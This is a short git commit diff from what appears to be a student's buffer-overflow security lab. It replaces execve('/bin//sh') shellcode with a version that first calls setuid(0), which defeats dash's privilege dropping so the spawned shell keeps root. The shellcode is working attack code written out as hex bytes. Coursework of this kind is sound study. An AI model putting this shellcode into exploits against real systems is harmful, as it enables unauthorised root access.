cdf9ab6c0e1e9e418584746d65404f7dbdfe72df
ZahinRakin <bsse1447@iit.du.ac.bd>
2025-07-29 06:46:07 -0400

    defeated both aslr and dash together

--- defeating_dash/call_shellcode.c
+++ defeating_dash/call_shellcode.c
@@ -3,20 +3,25 @@
 /*A program that creates a file containing code for launching shell*/
 #include <stdlib.h>
 #include <stdio.h>
+#include <string.h>
 
-const char code[] =
-  "\x31\xc0"             /* xorl    %eax,%eax              */
-  "\x50"                 /* pushl   %eax                   */
-  "\x68""//sh"           /* pushl   $0x68732f2f            */
-  "\x68""/bin"           /* pushl   $0x6e69622f            */
-  "\x89\xe3"             /* movl    %esp,%ebx              */
-  "\x50"                 /* pushl   %eax                   */
-  "\x53"                 /* pushl   %ebx                   */
-  "\x89\xe1"             /* movl    %esp,%ecx              */
-  "\x99"                 /* cdq                            */
-  "\xb0\x0b"             /* movb    $0x0b,%al              */
-  "\xcd\x80"             /* int     $0x80                  */
-;
+char code[] =  
+    "\x31\xc0"    /* Line 1: xori   %eax,%eax  */  
+    "\x31\xdb"    /* Line 2: xori   %ebx,%ebx  */  
+    "\xb0\xd5"    /* Line 3: movb   $0xd5,%al  */  
+    "\xcd\x80"    /* Line 4: int   $0x80  */  
+    // --- The code below is the same as the one in Task 2 ---  
+    "\x31\xc0"  
+    "\x50"  
+    "\x68""//sh"  
+    "\x68""/bin"  
+    "\x89\xe3"  
+    "\x50"  
+    "\x53"  
+    "\x89\xe1"  
+    "\x99"  
+    "\xb0\x0b"  
+    "\xcd\x80";
 
 int main(int argc, char **argv)
 {
